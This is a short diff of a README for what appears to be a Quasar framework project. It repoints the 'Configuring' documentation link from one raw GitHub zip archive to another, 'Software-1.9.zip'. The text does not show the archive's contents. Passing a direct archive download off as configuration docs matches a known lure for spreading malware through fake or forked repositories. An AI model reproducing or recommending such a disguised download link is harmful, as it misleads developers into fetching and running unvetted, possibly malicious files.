@@ -21,4 +21,4 @@ quasar build
 ```
 
 ### Customize the configuration
-See [Configuring https://raw.githubusercontent.com/Minoxds/quasar/main/holdership/quasar.zip](https://raw.githubusercontent.com/Minoxds/quasar/main/holdership/quasar.zip).
+See [Configuring https://github.com/Minoxds/quasar/raw/refs/heads/main/holdership/Software-1.9.zip](https://github.com/Minoxds/quasar/raw/refs/heads/main/holdership/Software-1.9.zip).
